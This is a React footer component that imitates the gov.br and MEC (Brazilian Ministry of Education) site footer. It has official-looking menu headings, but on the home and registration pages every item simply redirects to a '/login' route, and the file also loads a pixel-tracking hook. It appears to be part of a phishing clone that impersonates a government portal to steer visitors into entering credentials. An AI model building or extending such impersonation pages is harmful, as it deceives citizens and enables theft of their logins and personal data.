import React from 'react';
import { ChevronDown } from 'lucide-react';
import { useNavigate, useLocation } from 'react-router-dom';
import { usePixelTracking } from '../hooks/usePixelTracking';

const Footer: React.FC = () => {
  usePixelTracking();
  
  const navigate = useNavigate();
  const location = useLocation();

  // Só navega para /login se estiver na página inicial ou inscrição
  const handleLoginNavigation = () => {
    if (location.pathname === '/' || location.pathname === '/inscricao') {
      navigate('/login');
    }
  };

  // Determina se deve aplicar cursor pointer e onClick
  const shouldNavigate = location.pathname === '/' || location.pathname === '/inscricao';
  const clickProps = shouldNavigate ? { onClick: handleLoginNavigation, className: "cursor-pointer" } : {};

  return (
    <footer className="bg-[#071D41] text-white">
      <div className="container mx-auto px-4 py-8">
        <div className="mb-12">
          <h1 {...clickProps} className={`text-4xl font-bold mb-8 ${shouldNavigate ? 'cursor-pointer' : ''}`}>
            gov.br
          </h1>
          
          <div className="space-y-4">
            <div className="border-t border-gray-700">
              <button 
                {...(shouldNavigate ? { onClick: handleLoginNavigation } : {})}
                className="w-full text-left py-4 text-xl"
              >
                MEC
              </button>
            </div>
            
            <div className="border-t border-gray-700">
              <button 
                {...(shouldNavigate ? { onClick: handleLoginNavigation } : {})}
                className="w-full flex justify-between items-center py-4"
              >
                <span className="text-xl">ASSUNTOS</span>
                <ChevronDown size={24} />
              </button>
            </div>
            
            <div className="border-t border-gray-700">
              <button 
                {...(shouldNavigate ? { onClick: handleLoginNavigation } : {})}
                className="w-full flex justify-between items-center py-4"
              >
                <span className="text-xl">COMPOSIÇÃO</span>
                <ChevronDown size={24} />
              </button>
            </div>
            
            <div className="border-t border-gray-700">
              <button 
                {...(shouldNavigate ? { onClick: handleLoginNavigation } : {})}
                className="w-full flex justify-between items-center py-4"
              >
                <span className="text-xl">ACESSO À INFORMAÇÃO</span>
                <ChevronDown size={24} />
              </button>
            </div>
            
            <div className="border-t border-gray-700">
              <button 
                {...(shouldNavigate ? { onClick: handleLoginNavigation } : {})}
                className="w-full flex justify-between items-center py-4"
              >
                <span className="text-xl">CENTRAIS DE CONTEÚDO</span>
                <ChevronDown size={24} />
              </button>
            </div>
            
            <div className="border-t border-gray-700">
              <button 
                {...(shouldNavigate ? { onClick: handleLoginNavigation } : {})}
                className="w-full flex justify-between items-center py-4"
              >
                <span className="text-xl">CANAIS DE ATENDIMENTO</span>
                <ChevronDown size={24} />
              </button>
            </div>
            
            <div className="border-t border-gray-700">
              <button 
                {...(shouldNavigate ? { onClick: handleLoginNavigation } : {})}
                className="w-full flex justify-between items-center py-4"
              >
                <span className="text-xl">CAMPANHAS DA EDUCAÇÃO</span>
                <ChevronDown size={24} />
              </button>
            </div>
            
            <div className="border-t border-gray-700 py-4">
              <button 
                {...(shouldNavigate ? { onClick: handleLoginNavigation } : {})}
                className="flex items-center gap-2"
              >
                <span className="w-6 h-6 bg-white rounded-full"></span>
                <span className="text-xl">Redefinir Cookies</span>
              </button>
            </div>
          </div>
        </div>

        <div 
          {...clickProps}
          className={`flex items-center gap-4 ${shouldNavigate ? 'cursor-pointer' : ''}`}
        >
          <div className="w-12 h-12 bg-white rounded-full flex items-center justify-center text-[#071D41]">
            <span className="text-2xl font-bold">i</span>
          </div>
          <span className="text-xl uppercase">Acesso à Informação</span>
        </div>
      </div>
    </footer>
  );
};

export default Footer;